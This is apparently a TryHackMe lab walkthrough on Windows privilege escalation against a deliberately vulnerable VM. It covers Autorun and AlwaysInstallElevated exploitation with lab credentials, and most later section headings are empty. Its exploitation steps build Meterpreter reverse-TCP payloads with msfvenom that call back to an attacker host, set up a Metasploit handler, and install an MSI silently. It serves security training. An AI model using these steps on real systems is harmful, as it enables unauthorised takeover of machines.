# Windows PrivEsc Arena

Students will learn how to escalate privileges using a very vulnerable Windows 7 VM. RDP is open. Your credentials are user:password321

* [Windows PrivEsc Arena](https://tryhackme.com/room/windowsprivescarena)

## Connecting to TryHackMe network

To complete this room and access the vulnerable Windows machine, you need to first connect to TryHackMe's VPN. If you've not done this before, first complete the [OpenVPN room](https://tryhackme.com/room/openvpn) and learn how to connect.

## Deploy the vulnerable machine

This room will teach you a variety of Windows privilege escalation tactics, including kernel exploits, DLL hijacking, service exploits, registry exploits, and more. This lab was built utilizing Sagi Shahar's privesc workshop ([https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)) and utilized as part of The Cyber Mentor's Windows Privilege Escalation Udemy course ([http://udemy.com/course/windows-privilege-escalation-for-beginners](http://udemy.com/course/windows-privilege-escalation-for-beginners)).

All tools needed to complete this course are on the **user** desktop (C:\Users\user\Desktop\Tools).

Let's first connect to the machine.  RDP is open on port 3389.  Your credentials are:

**username**: user
**password**: password321

For any administrative actions you might take, your credentials are:

**username**: TCM
**password**: Hacker123

1. Deploy the machine and log into the user account via RDP
2. Open a command prompt and run 'net user'. Who is the other non-default user on the machine?

## Registry Escalation - Autorun

**Detection**

**Windows VM**

1. Open command prompt and type: `C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe`
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: `C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\Autorun Program"`
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.


**Exploitation**

**Kali VM**

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`
6. Open an additional command prompt and type: `msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe`
7. Copy the generated file, program.exe, to the Windows VM.

**Windows VM**

1. Place program.exe in ‘C:\Program Files\Autorun Program’.
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

**Kali VM**

1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf > prompt) type: `sessions -i [Session ID]`
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: getuid

---

1. Click 'Completed' once you have successfully elevated the machine

## Registry Escalation - AlwaysInstallElevated

**Detection**

**Windows VM**

1. Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2. From the output, notice that “AlwaysInstallElevated” value is 1.
3. In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4. From the output, notice that “AlwaysInstallElevated” value is 1.

**Exploitation**

**Kali VM**

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
7. Copy the generated file, setup.msi, to the Windows VM.

**Windows VM**

1. Place ‘setup.msi’ in ‘C:\Temp’.
2. Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi

Enjoy your shell! :)

## Service Escalation - Registry
## Service Escalation - Executable Files
## Privilege Escalation - Startup Applications
## Service Escalation - DLL Hijacking
## Service Escalation - binPath
## Service Escalation - Unquoted Service Paths
## Potato Escalation - Hot Potato
## Password Mining Escalation - Configuration Files
## Password Mining Escalation - Memory
## Privilege Escalation - Kernel Exploits